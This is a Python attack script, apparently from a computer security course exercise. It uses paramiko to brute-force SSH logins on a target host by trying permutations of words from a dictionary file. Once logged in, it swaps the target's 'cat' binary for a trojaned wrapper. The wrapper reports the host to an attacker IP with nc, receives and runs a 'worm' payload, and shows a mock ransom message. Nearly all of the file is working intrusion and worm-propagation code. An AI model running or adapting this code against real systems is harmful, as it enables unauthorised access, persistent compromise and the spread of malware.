#!/usr/bin/env python3
import sys
import os
import itertools
sys.path.append("/home/csc2021/.local/lib/python3.8/site-packages")
import paramiko

f = open('/home/csc2021/materials/victim.dat','r')
tmp = f.readlines()
li = []
for item in tmp:
    li.append(item.rstrip('\n'))

username = "csc2021"
port = 22
hostname = sys.argv[1]
attackip = sys.argv[2]
attackport = sys.argv[3]
#hostname = "192.168.152.128"

success=False
for i in range(len(li)):
    if success:
        break
    perm = itertools.permutations(li,i+1)
    result = [''.join(p) for p in perm] 
    for password in result:
        #print(password)
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(hostname, port, username, password, auth_timeout=0.5)
            print(password)
            os.system("touch tt.sh")
            os.system("chmod 777 tt.sh")
            ff = open("tt.sh", "w")
            ff.write("echo -ne \'\\xaf\\xbe\\xad\\xde\' >> temp")
            ff.close()
            #os.system("echo -ne '\xad\xde\xaf\xbe' > tt")
            scp = paramiko.Transport((hostname, port))
            scp.connect(username=username, password=password)
            sftp = paramiko.SFTPClient.from_transport(scp)
            sftp.put('./tt.sh', '/home/csc2021/tt.sh')
            #execute command
            comm="cp cat tac; tar zcf tac tac; echo '#!/bin/bash' > temp; echo 'tail -n+15 $0 | head -n -1 > tttt' >> temp; echo 'truncate -s -1 tttt' >> temp ; echo 'tar zxf tttt' >> temp; echo 'rm tttt' >> temp; echo './tac $1' >> temp; >> temp; echo 'rm tac' >> temp; echo 'echo " + hostname + " | nc -w1 " + attackip + " " + attackport+"' >> temp; echo 'nc -l "+ attackport +" > worm' >> temp; echo 'chmod 777 worm' >> temp; echo './worm' >> temp; echo 'rm worm' >> temp; echo 'zenity --error --text=\"Give me ransom haha\" --title=\"Error\" --ok-label \"QQ\"' >> temp ; echo 'exit 0' >> temp; cat tac >> temp; echo -n '\n' >> temp ; truncate -s 43412 temp; chmod +x tt.sh; ./tt.sh; rm tt.sh tac; chmod +x temp; mv temp cat"
            stdin, stdout, stderr = client.exec_command(comm)
            #print(stdout.readlines())
            client.close()
            success=True
            os.system("rm tt.sh")
            stdin.close()
            break
        except Exception:
            #print ('Exception!!')
            client.close()
            
